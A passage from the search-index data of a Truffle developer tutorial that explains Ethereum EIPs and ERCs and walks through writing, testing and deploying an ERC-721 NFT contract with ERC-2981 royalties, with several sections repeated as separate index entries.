, Networking , Interface , and ERC . Core describes improvements that either require a consensus fork, a major technical change to the \"rules\" of Ethereum (how gas is charged in EIP 5 ), or are generally relevant to core developer discussions (miners checking that gas price is sufficiently high in EIP-86 ). Networking describes improvements around devp2p , Light Ethereum Subprotocol , and the network protocol specifications of whisper and swarm . Interface describes improvements on API/RPC specifications and standards and certain language-level standards like method names and contract ABIs. ERC describes application level standards. We'll dive more in depth in the next section. Meta describes changing a process surrounding Ethereum, such as changes to a decision-making process. Informational provides general information or describes an Ethereum design issue, but does not propose a new feature. Users are free to ignore informational EIPs because informational EIPs do not necessarily represent an Ethereum community recommendation. What is an ERC? \u00b6 ERC stands for Ethereum Request for Comment. As mentioned above, this describes application level conventions such as token standards, name registries, URI schemes, library/package formats, and wallet formats. ERCs specify a required set of functions that contracts need to implement so that apps and other contracts can understand how to interact with them. For example, one of the most popular standards is the ERC-721 standard, which defines what an NFT is. Because an application knows what an ERC-721 looks like, it knows what functions and properties it can interact with on the contract. Note that ERCs are not considered a core EIP, so adopting the standard is up to the developer. As a result, raising awareness around an ERC is crucial to its utility and success. Why do EIPs and ERCs matter? \u00b6 EIPs serve as the core way in which governance happens in Ethereum. Anyone is allowed to propose them, and community members comment, debate, and collaborate to decide whether or not it should be adopted! You can find the guidelines to submit your own here . ERCs are what powers the composability of smart contracts! Composability defines the ability of dapps and contracts to interact with each other. For example, the ERC-2981 NFT royalty standard defines how royalty information is stored on the contract, so that when dapps such as marketplaces make sales, they know how to get the royalty information necessary to compensate the artist! What's in an ERC-2981? \u00b6 As mentioned above, an ERC-2981 is the royalty standard. In order to qualify as an ERC-2981, the smart contract must have the following functions: pragma solidity ^ 0.6.0 ; import \"./IERC165.sol\" ; /// /// @dev Interface for the NFT Royalty Standard /// interface IERC2981 is IERC165 { /// ERC165 bytes to add to interface array - set in parent contract /// implementing this standard /// /// bytes4(keccak256(\"royaltyInfo(uint256,uint256)\")) == 0x2a55205a /// bytes4 private constant _INTERFACE_ID_ERC2981 = 0x2a55205a; /// _registerInterface(_INTERFACE_ID_ERC2981); /// @notice Called with the sale price to determine how much royalty // is owed and to whom. /// @param _tokenId - the NFT asset queried for royalty information /// @param _salePrice - the sale price of the NFT asset specified by _tokenId /// @return receiver - address of who should be sent the royalty payment /// @return royaltyAmount - the royalty payment amount for _salePrice function royaltyInfo ( uint256 _tokenId , uint256 _salePrice ) external view returns ( address receiver , uint256 royaltyAmount ); } interface IERC165 { /// @notice Query if a contract implements an interface /// @param interfaceID The interface identifier, as specified in ERC-165 /// @dev Interface identification is specified in ERC-165. This function /// uses less than 30,000 gas. /// @return `true` if the contract implements `interfaceID` and /// `interfaceID` is not 0xffffffff, `false` otherwise function supportsInterface ( bytes4 interfaceID ) external view returns ( bool ); } Side note: ERC-165 is a standard that allows contracts to declare their support of an interface. This is what will allow marketplaces to check if the NFT supports the royalty standard! That might look something like this in a marketplace contract: bytes4 private constant _INTERFACE_ID_ERC2981 = 0x2a55205a ; function checkRoyalties ( address _contract ) internal returns ( bool ) { ( bool success ) = IERC165 ( _contract ). supportsInterface ( _INTERFACE_ID_ERC2981 ); return success ; } Before we start writing code, let's first step through some important caveats about the NFT royalty standard. The royalty payments are not enforced by the standard. It is up to the marketplace to act upon that information. Currently, Coinbase NFT, Rarible, SuperRare, and Zora pay out royalties for an ERC-2981. If your NFT is being sold on OpenSea, you will have to separately set royalties on your NFT through their website. This standard does not require ERC-721 (NFT standard) and ERC-1155 (multi-token standard) compatibility. So it is perhaps more appropriate to say a \"universal royalty standard\"! Let's Write an ERC-2981! \u00b6 Now that we've covered what EIPs are, what ERCs are, and how they represent the ERC-2981, let's actually write an ERC-721 NFT smart contract that implements the ERC-2981 royalty standard. You can find the completed code here . We'll be importing Open Zeppelin's contracts, which provide secure, pre-written implementations of the ERC that our contract can just inherit! Note that we will not be covering the basics of the ERC-721 standard. You can find a great Infura blog detailing what it is and how to implement it here . Download System Requirements \u00b6 You'll need to install: Node.js , v12 or higher truffle ganache UI or ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it nft-royalty , and select Web3 API from the dropdown Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. Set Up Your Project \u00b6 Truffle has some nifty functions to scaffold your truffle project and add example contracts and tests. We'll be building our project in a folder called nft-royalty . truffle init nft-royalty cd nft-royalty truffle create contract RoyalPets truffle create test TestRoyalties Afterwards, your project structure should look something like this: nft-royalty \u251c\u2500\u2500 contracts \u2502 \u2514\u2500\u2500 RoyalPets.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_contracts.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 test_royalties.js \u2514\u2500\u2500 truffle-config.js Write the NFT Smart Contract \u00b6 Open Zeppelin already provides secure, pre-written ERC-2981 and ERC-721 contract implementations we can just inherit! To download them, simply call npm i \"@openzeppelin/contracts\" . With OpenZeppelin, we have a few ways of identifying that an NFT contract fits the royalty standard. Since our base contract will be an ERC-721, we have the option of inheriting OpenZeppelin's royalty extension ERC721Royalty . This contract overrides the _burn function to also clear the royalty information for the token. Important note! Both this function and the _burn function from OpenZeppelin do not check for tokenId ownership. That means anyone can burn this NFT. If you want to avoid this, add a require check checking for that condition. function _burn ( uint256 tokenId ) internal virtual override { super . _burn ( tokenId ); _resetTokenRoyalty ( tokenId ); } Upon contract creation, we want to set a defaulty royalty recipient and percentage. Note that OpenZeppelin calculates the royalty fee using basis points. In order to set the default recipient to be the owner of the contract and the fee to be 1%, set it in the constructor: import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol\" ; contract RoyalPets is ERC721Royalty { constructor () ERC721 ( \"RoyalPets\" , \"RP\" ) { _setDefaultRoyalty ( msg . sender , 100 ); } } However, in this tutorial, we want to use OpenZeppelin's ERC721URIStorage extension. In this case, we want it to also inherit the properties of OpenZeppelin's ERC2981 contract like so: import \"@openzeppelin/contracts/token/common/ERC2981.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; contract RoyalPets is ERC721URIStorage , ERC2981 { constructor () ERC721 ( \"RoyalPets\" , \"RP\" ) { _setDefaultRoyalty ( msg . sender , 100 ); } } We do run into a problem though. ERC721URIStorage and ERC2981 both override supportsInterface ! To fix this, we need to override it in RoyalPets as well. Add in this function: function supportsInterface ( bytes4 interfaceId ) public view virtual override ( ERC721 , ERC2981 ) returns ( bool ) { return super . supportsInterface ( interfaceId ); } Additionally, because we are no longer inheriting ERC721Royalty , we no longer have its _burn override. Let's add that in: function _burn ( uint256 tokenId ) internal virtual override { super . _burn ( tokenId ); _resetTokenRoyalty ( tokenId ); } So that external accounts can burn their NFTs, expose a public version of burn: function burnNFT ( uint256 tokenId ) public { _burn ( tokenId ); } Lastly, we'll add in the actual NFT minting functionality. We'll create two types of minting functions: one that mints tokens with the default royalty info, and one that specifies royalty info on a per-token basis. As mentioned before, those basics are covered in this Infura blog . One minor difference is that we will not be using a static metadata file to populate the tokenURI . The two minting functions look like this: function mintNFT ( address recipient , string memory tokenURI ) public onlyOwner returns ( uint256 ) { _tokenIds . increment (); uint256 newItemId = _tokenIds . current (); _safeMint ( recipient , newItemId ); _setTokenURI ( newItemId , tokenURI ); return newItemId ; } function mintNFTWithRoyalty ( address recipient , string memory tokenURI , address royaltyReceiver , uint96 feeNumerator ) public onlyOwner returns ( uint256 ) { uint256 tokenId = mintNFT ( recipient , tokenURI ); _setTokenRoyalty ( tokenId , royaltyReceiver , feeNumerator ); return tokenId ; } Your final smart contract should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/token/common/ERC2981.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract RoyalPets is ERC721URIStorage , ERC2981 , Ownable { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; constructor () ERC721 ( \"RoyalPets\" , \"RP\" ) { _setDefaultRoyalty ( msg . sender , 100 ); } function supportsInterface ( bytes4 interfaceId ) public view virtual override ( ERC721 , ERC2981 ) returns ( bool ) { return super . supportsInterface ( interfaceId ); } function _burn ( uint256 tokenId ) internal virtual override { super . _burn ( tokenId ); _resetTokenRoyalty ( tokenId ); } function burnNFT ( uint256 tokenId ) public onlyOwner { _burn ( tokenId ); } function mintNFT ( address recipient , string memory tokenURI ) public onlyOwner returns ( uint256 ) { _tokenIds . increment (); uint256 newItemId = _tokenIds . current (); _safeMint ( recipient , newItemId ); _setTokenURI ( newItemId , tokenURI ); return newItemId ; } function mintNFTWithRoyalty ( address recipient , string memory tokenURI , address royaltyReceiver , uint96 feeNumerator ) public onlyOwner returns ( uint256 ) { uint256 tokenId = mintNFT ( recipient , tokenURI ); _setTokenRoyalty ( tokenId , royaltyReceiver , feeNumerator ); return tokenId ; } } Deploy the Smart Contracts Locally \u00b6 In order to deploy our smart contracts, we'll need to modify migrations/1_deploy_contracts.js like so: const RoyalPets = artifacts . require ( \"Royalpets\" ); module . exports = function ( deployer ) { deployer . deploy ( RoyalPets ); }; Next, let's get a local Ganache instance up. There are a variety of ways to do so: through the VS Code extension, Ganache CLI, and the Ganche graphical user interface. Each has its own advantages, and you can check out v7's coolest features here . In this tutorial, we'll be using the GUI. Open it up, create a workspace, and hit save (feel free to add your project to use some of the nifty features from the Ganache UI)! This creates a running Ganache instance at HTTP://127.0.0.1:7545. Next, uncomment the development network in your truffle-config.js and modify the port number to 7545 to match. development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) } Now, simply run truffle migrate , which defaults to the development network, to deploy! You can also deploy from the VS Code extension as well. Then, you can see your built contracts in build/contracts , from the VS Code extension, or in your Ganache UI! Test Your Smart Contract \u00b6 If you want to test your smart contract commands on the fly without writing a full test, you can do so through truffle develop or truffle console . Read more about it here . For the purposes of this tutorial, we'll just go ahead and write a Javascript test. Note that with Truffle, you have the option of writing tests in Javascript, Typescript, or Solidity. const RoyalPets = artifacts . require ( \"RoyalPets\" ); contract ( \"RoyalPets\" , function ( accounts ) { it ( \"should support the ERC721 and ERC2198 standards\" , async () => { const royalPetsInstance = await RoyalPets . deployed (); const ERC721InterfaceId = \"0x80ac58cd\" ; const ERC2981InterfaceId = \"0x2a55205a\" ; var isERC721 = await royalPetsInstance . supportsInterface ( ERC721InterfaceId ); var isER2981 = await royalPetsInstance . supportsInterface ( ERC2981InterfaceId ); assert . equal ( isERC721 , true , \"RoyalPets is not an ERC721\" ); assert . equal ( isER2981 , true , \"RoyalPets is not an ERC2981\" ); }); it ( \"should return the correct royalty info when specified and burned\" , async () => { const royalPetsInstance = await RoyalPets . deployed (); await royalPetsInstance . mintNFT ( accounts [ 0 ], \"fakeURI\" ); // Override royalty for this token to be 10% and paid to a different account await royalPetsInstance . mintNFTWithRoyalty ( accounts [ 0 ], \"fakeURI\" , accounts [ 1 ], 1000 ); const defaultRoyaltyInfo = await royalPetsInstance . royaltyInfo . call ( 1 , 1000 ); var tokenRoyaltyInfo = await royalPetsInstance . royaltyInfo . call ( 2 , 1000 ); const owner = await royalPetsInstance . owner . call (); assert . equal ( defaultRoyaltyInfo [ 0 ], owner , \"Default receiver is not the owner\" ); // Default royalty percentage taken should be 1%. assert . equal ( defaultRoyaltyInfo [ 1 ]. toNumber (), 10 , \"Royalty fee is not 10\" ); assert . equal ( tokenRoyaltyInfo [ 0 ], accounts [ 1 ], \"Royalty receiver is not a different account\" ); // Default royalty percentage taken should be 1%. assert . equal ( tokenRoyaltyInfo [ 1 ]. toNumber (), 100 , \"Royalty fee is not 100\" ); // Royalty info should be set back to default when NFT is burned await royalPetsInstance . burnNFT ( 2 ); tokenRoyaltyInfo = await royalPetsInstance . royaltyInfo . call ( 2 , 1000 ); assert . equal ( tokenRoyaltyInfo [ 0 ], owner , \"Royalty receiver has not been set back to default\" ); assert . equal ( tokenRoyaltyInfo [ 1 ]. toNumber (), 10 , \"Royalty has not been set back to default\" ); }); }); And, finally, just call truffle test ! Contract: RoyalPets \u2714 should support the ERC721 and ERC2198 standards ( 67ms ) \u2714 should return the correct royalty info when specified and burned ( 1077ms ) 2 passing ( 1s ) Mint an NFT and View it in Your Mobile Wallet or OpenSea! \u00b6 If you want to mint an NFT for yourself and view it in your mobile MetaMask wallet, you'll need to deploy your contract to a public testnet or mainnet. To do so, you'll need to grab your Infura project API from your Infura project and your MetaMask wallet secret key. At the root of your folder, add a .env file, in which we'll put in that information. WARNING: DO NOT PUBLICIZE OR COMMIT THIS FILE. We recommend adding .env to a .gitignore file. MNEMONIC = \"YOUR SECRET KEY\" INFURA_API_KEY = \"YOUR INFURA_API_KEY\" Then, at the top of truffle-config.js , add this code to get retrieve that information: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); And finally, add the Goerli network to the networks list under module.exports : goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } Your final truffle-config.js should look something like this: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); module . exports = { networks : { development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) }, goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } }, // Set default mocha options here, use special reporters, etc. mocha : { // timeout: 100000 }, // Configure your compilers compilers : { solc : { version : \"0.8.15\" , // Fetch exact version from solc-bin (default: truffle's version) } }, }; Then, we'll need to install the dev dependencies for dotenv and @truffle/hdwallet-provider . Lastly, run truffle migrate --network goerli to deploy! npm i --save-dev dotenv npm i --save-dev @truffle/hdwallet-provider truffle migrate --network goerli Then, to quickly interact with the goerli network, we can use truffle console --network goerli , and call the appropriate contract functions. We've already pinned some metadata to IPFS for you to use as your tokenURI: ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4 . It should look a bit like this: truffle migrate --network goerli truffle ( goerli ) > const contract = await RoyalPets.deployed () undefined truffle ( goerli ) > await contract.mintNFT ( \"YOUR ADDRESS\" , \"ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4\" ) If you want to populate your own metadata, there are a variety of ways to do so - with either Truffle or Infura. Check out the guides here: - truffle preserve - infura IPFS To view your NFT on your mobile wallet, open up MetaMask mobile, switch to the Goerli network, and open the NFTs tab! To view on OpenSea, you'll have to deploy to mainnet or Polygon. Otherwise, if you deploy your contract to rinkeby , you can view it on https://testnets.opensea.io/ . To be aware that rinkeby will be deprecated after the merge . If you don't want to monitor your transactions in an Infura project, you can also deploy via Truffle Dashboard , which allows you to deploy and sign transactions via MetaMask - thus never revealing your private key! To do so, simply run: truffle dashboard truffle migrate --network dashboard truffle console --network dashboard Future Extensions \u00b6 And there you have it! You've written an NFT smart contract that can be queried for royalty information. Look out for a more in-depth guide for uploading your metadata to IPFS! For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . In future editions of Web3 Unleashed, expect to see how we can make our basic ERC-721s rentable by implementing ERC-4907 as well as creating a NFT rental marketplace that uses the various NFT standards that exist! Some additional extensions you might consider is overriding the way royaltyInfo is returned. Gemini has a cool blog detailing some such as decaying royalties, multisig royalties, and stepped royalties here . Let us know if you try any of them out! If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Write an NFT Smart Contract with Royalties"}, {"location": "guides/nft-royalty/#web3-unleashed-write-an-nft-smart-contract-with-royalties", "text": "Written by Emily Lin Last updated 8/5/2022", "title": "Web3 Unleashed: Write an NFT Smart Contract with Royalties"}, {"location": "guides/nft-royalty/#overview", "text": "In this chapter of Web3 Unleashed, we're going to briefly go over what an Ethereum Improvement Proposal (EIP) and an Ethereum Request for Comment (ERC) is, how they are used, and implement the ERC-2981, NFT royalty standard, as an example.", "title": "Overview"}, {"location": "guides/nft-royalty/#what-is-an-eip", "text": "EIP stands for Ethereum Improvement Proposal, a technical design document that specifies new features and processes for Ethereum. EIPs serve as the primary mechanism for Proposing new features Collecting community technical input on an issue Documenting the design decisions that have gone into Ethereum. There are three types of EIPs: Standard Track describes any change that affects most or all Ethereum implementations. This is further split into the categories Core , Networking , Interface , and ERC . Core describes improvements that either require a consensus fork, a major technical change to the \"rules\" of Ethereum (how gas is charged in EIP 5 ), or are generally relevant to core developer discussions (miners checking that gas price is sufficiently high in EIP-86 ). Networking describes improvements around devp2p , Light Ethereum Subprotocol , and the network protocol specifications of whisper and swarm . Interface describes improvements on API/RPC specifications and standards and certain language-level standards like method names and contract ABIs. ERC describes application level standards. We'll dive more in depth in the next section. Meta describes changing a process surrounding Ethereum, such as changes to a decision-making process. Informational provides general information or describes an Ethereum design issue, but does not propose a new feature. Users are free to ignore informational EIPs because informational EIPs do not necessarily represent an Ethereum community recommendation.", "title": "What is an EIP?"}, {"location": "guides/nft-royalty/#what-is-an-erc", "text": "ERC stands for Ethereum Request for Comment. As mentioned above, this describes application level conventions such as token standards, name registries, URI schemes, library/package formats, and wallet formats. ERCs specify a required set of functions that contracts need to implement so that apps and other contracts can understand how to interact with them. For example, one of the most popular standards is the ERC-721 standard, which defines what an NFT is. Because an application knows what an ERC-721 looks like, it knows what functions and properties it can interact with on the contract. Note that ERCs are not considered a core EIP, so adopting the standard is up to the developer. As a result, raising awareness around an ERC is crucial to its utility and success.", "title": "What is an ERC?"}, {"location": "guides/nft-royalty/#why-do-eips-and-ercs-matter", "text": "EIPs serve as the core way in which governance happens in Ethereum. Anyone is allowed to propose them, and community members comment, debate, and collaborate to decide whether or not it should be adopted! You can find the guidelines to submit your own here . ERCs are what powers the composability of smart contracts! Composability defines the ability of dapps and contracts to interact with each other. For example, the ERC-2981 NFT royalty standard defines how royalty information is stored on the contract, so that when dapps such as marketplaces make sales, they know how to get the royalty information necessary to compensate the artist!", "title": "Why do EIPs and ERCs matter?"}, {"location": "guides/nft-royalty/#whats-in-an-erc-2981", "text": "As mentioned above, an ERC-2981 is the royalty standard. In order to qualify as an ERC-2981, the smart contract must have the following functions: pragma solidity ^ 0.6.0 ; import \"./IERC165.sol\" ; /// /// @dev Interface for the NFT Royalty Standard /// interface IERC2981 is IERC165 { /// ERC165 bytes to add to interface array - set in parent contract /// implementing this standard /// /// bytes4(keccak256(\"royaltyInfo(uint256,uint256)\")) == 0x2a55205a /// bytes4 private constant _INTERFACE_ID_ERC2981 = 0x2a55205a; /// _registerInterface(_INTERFACE_ID_ERC2981); /// @notice Called with the sale price to determine how much royalty // is owed and to whom. /// @param _tokenId - the NFT asset queried for royalty information /// @param _salePrice - the sale price of the NFT asset specified by _tokenId /// @return receiver - address of who should be sent the royalty payment /// @return royaltyAmount - the royalty payment amount for _salePrice function royaltyInfo ( uint256 _tokenId , uint256 _salePrice ) external view returns ( address receiver , uint256 royaltyAmount ); } interface IERC165 { /// @notice Query if a contract implements an interface /// @param interfaceID The interface identifier, as specified in ERC-165 /// @dev Interface identification is specified in ERC-165. This function /// uses less than 30,000 gas. /// @return `true` if the contract implements `interfaceID` and /// `interfaceID` is not 0xffffffff, `false` otherwise function supportsInterface ( bytes4 interfaceID ) external view returns ( bool ); } Side note: ERC-165 is a standard that allows contracts to declare their support of an interface. This is what will allow marketplaces to check if the NFT supports the royalty standard! That might look something like this in a marketplace contract: bytes4 private constant _INTERFACE_ID_ERC2981 = 0x2a55205a ; function checkRoyalties ( address _contract ) internal returns ( bool ) { ( bool success ) = IERC165 ( _contract ). supportsInterface ( _INTERFACE_ID_ERC2981 ); return success ; } Before we start writing code, let's first step through some important caveats about the NFT royalty standard. The royalty payments are not enforced by the standard. It is up to the marketplace to act upon that information. Currently, Coinbase NFT, Rarible, SuperRare, and Zora pay out royalties for an ERC-2981. If your NFT is being sold on OpenSea, you will have to separately set royalties on your NFT through their website. This standard does not require ERC-721 (NFT standard) and ERC-1155 (multi-token standard) compatibility. So it is perhaps more appropriate to say a \"universal royalty standard\"!", "title": "What's in an ERC-2981?"}, {"location": "guides/nft-royalty/#lets-write-an-erc-2981", "text": "Now that we've covered what EIPs are, what ERCs are, and how they represent the ERC-2981, let's actually write an ERC-721 NFT smart contract that implements the ERC-2981 royalty standard. You can find the completed code here . We'll be importing Open Zeppelin's contracts, which provide secure, pre-written implementations of the ERC that our contract can just inherit! Note that we will not be covering the basics of the ERC-721 standard. You can find a great Infura blog detailing what it is and how to implement it here .", "title": "Let's Write an ERC-2981!"}, {"location": "guides/nft-royalty/#download-system-requirements", "text": "You'll need to install: Node.js , v12 or higher truffle ganache UI or ganache CLI", "title": "Download System Requirements"}, {"location": "guides/nft-royalty/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it nft-royalty , and select Web3 API from the dropdown", "title": "Create an Infura account and project"}, {"location": "guides/nft-royalty/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/nft-royalty/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/nft-royalty/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once.", "title": "Get Some Test Eth"}, {"location": "guides/nft-royalty/#set-up-your-project", "text": "Truffle has some nifty functions to scaffold your truffle project and add example contracts and tests. We'll be building our project in a folder called nft-royalty . truffle init nft-royalty cd nft-royalty truffle create contract RoyalPets truffle create test TestRoyalties Afterwards, your project structure should look something like this: nft-royalty \u251c\u2500\u2500 contracts \u2502 \u2514\u2500\u2500 RoyalPets.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_contracts.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 test_royalties.js \u2514\u2500\u2500 truffle-config.js", "title": "Set Up Your Project"}, {"location": "guides/nft-royalty/#write-the-nft-smart-contract", "text": "Open Zeppelin already provides secure, pre-written ERC-2981 and ERC-721 contract implementations we can just inherit! To download them, simply call npm i \"@openzeppelin/contracts\" . With OpenZeppelin, we have a few ways of identifying that an NFT contract fits the royalty standard. Since our base contract will be an ERC-721, we have the option of inheriting OpenZeppelin's royalty extension ERC721Royalty . This contract overrides the _burn function to also clear the royalty information for the token. Important note! Both this function and the _burn function from OpenZeppelin do not check for tokenId ownership. That means anyone can burn this NFT. If you want to avoid this, add a require check checking for that condition. function _burn ( uint256 tokenId ) internal virtual override { super . _burn ( tokenId ); _resetTokenRoyalty ( tokenId ); } Upon contract creation, we want to set a defaulty royalty recipient and percentage. Note that OpenZeppelin calculates the royalty fee using basis points. In order to set the default recipient to be the owner of the contract and the fee to be 1%, set it in the constructor: import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol\" ; contract RoyalPets is ERC721Royalty { constructor () ERC721 ( \"RoyalPets\" , \"RP\" ) { _setDefaultRoyalty ( msg . sender , 100 ); } } However, in this tutorial, we want to use OpenZeppelin's ERC721URIStorage extension. In this case, we want it to also inherit the properties of OpenZeppelin's ERC2981 contract like so: import \"@openzeppelin/contracts/token/common/ERC2981.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; contract RoyalPets is ERC721URIStorage , ERC2981 { constructor () ERC721 ( \"RoyalPets\" , \"RP\" ) { _setDefaultRoyalty ( msg . sender , 100 ); } } We do run into a problem though. ERC721URIStorage and ERC2981 both override supportsInterface ! To fix this, we need to override it in RoyalPets as well. Add in this function: function supportsInterface ( bytes4 interfaceId ) public view virtual override ( ERC721 , ERC2981 ) returns ( bool ) { return super . supportsInterface ( interfaceId ); } Additionally, because we are no longer inheriting ERC721Royalty , we no longer have its _burn override. Let's add that in: function _burn ( uint256 tokenId ) internal virtual override { super . _burn ( tokenId ); _resetTokenRoyalty ( tokenId ); } So that external accounts can burn their NFTs, expose a public version of burn: function burnNFT ( uint256 tokenId ) public { _burn ( tokenId ); } Lastly, we'll add in the actual NFT minting functionality. We'll create two types of minting functions: one that mints tokens with the default royalty info, and one that specifies royalty info on a per-token basis. As mentioned before, those basics are covered in this Infura blog . One minor difference is that we will not be using a static metadata file to populate the tokenURI . The two minting functions look like this: function mintNFT ( address recipient , string memory tokenURI ) public onlyOwner returns ( uint256 ) { _tokenIds . increment (); uint256 newItemId = _tokenIds . current (); _safeMint ( recipient , newItemId ); _setTokenURI ( newItemId , tokenURI ); return newItemId ; } function mintNFTWithRoyalty ( address recipient , string memory tokenURI , address royaltyReceiver , uint96 feeNumerator ) public onlyOwner returns ( uint256 ) { uint256 tokenId = mintNFT ( recipient , tokenURI ); _setTokenRoyalty ( tokenId , royaltyReceiver , feeNumerator ); return tokenId ; } Your final smart contract should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/token/common/ERC2981.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract RoyalPets is ERC721URIStorage , ERC2981 , Ownable { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; constructor () ERC721 ( \"RoyalPets\" , \"RP\" ) { _setDefaultRoyalty ( msg . sender , 100 ); } function supportsInterface ( bytes4 interfaceId ) public view virtual override ( ERC721 , ERC2981 ) returns ( bool ) { return super . supportsInterface ( interfaceId ); } function _burn ( uint256 tokenId ) internal virtual override { super . _burn ( tokenId ); _resetTokenRoyalty ( tokenId ); } function burnNFT ( uint256 tokenId ) public onlyOwner { _burn ( tokenId ); } function mintNFT ( address recipient , string memory tokenURI ) public onlyOwner returns ( uint256 ) { _tokenIds . increment (); uint256 newItemId = _tokenIds . current (); _safeMint ( recipient , newItemId ); _setTokenURI ( newItemId , tokenURI ); return newItemId ; } function mintNFTWithRoyalty ( address recipient , string memory tokenURI , address royaltyReceiver , uint96 feeNumerator ) public onlyOwner returns ( uint256 ) { uint256 tokenId = mintNFT ( recipient , tokenURI ); _setTokenRoyalty ( tokenId , royaltyReceiver , feeNumerator ); return tokenId ; } }", "title": "Write the NFT Smart Contract"}, {"location": "guides/nft-royalty/#deploy-the-smart-contracts-locally", "text": "In order to deploy our smart contracts, we'll need to modify migrations/1_deploy_contracts.js like so: const RoyalPets = artifacts . require ( \"Royalpets\" ); module . exports = function ( deployer ) { deployer . deploy ( RoyalPets ); }; Next, let's get a local Ganache instance up. There are a variety of ways to do so: through the VS Code extension, Ganache CLI, and the Ganche graphical user interface. Each has its own advantages, and you can check out v7's coolest features here . In this tutorial, we'll be using the GUI. Open it up, create a workspace, and hit save (feel free to add your project to use some of the nifty features from the Ganache UI)! This creates a running Ganache instance at HTTP://127.0.0.1:7545. Next, uncomment the development network in your truffle-config.js and modify the port number to 7545 to match. development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) } Now, simply run truffle migrate , which defaults to the development network, to deploy! You can also deploy from the VS Code extension as well. Then, you can see your built contracts in build/contracts , from the VS Code extension, or in your Ganache UI!", "title": "Deploy the Smart Contracts Locally"}, {"location": "guides/nft-royalty/#test-your-smart-contract", "text": "If you want to test your smart contract commands on the fly without writing a full test, you can do so through truffle develop or truffle console . Read more about it here . For the purposes of this tutorial, we'll just go ahead and write a Javascript test. Note that with Truffle, you have the option of writing tests in Javascript, Typescript, or Solidity. const RoyalPets = artifacts . require ( \"RoyalPets\" ); contract ( \"RoyalPets\" , function ( accounts ) { it ( \"should support the ERC721 and ERC2198 standards\" , async () => { const royalPetsInstance = await RoyalPets . deployed (); const ERC721InterfaceId = \"0x80ac58cd\" ; const ERC2981InterfaceId = \"0x2a55205a\" ; var isERC721 = await royalPetsInstance . supportsInterface ( ERC721InterfaceId ); var isER2981 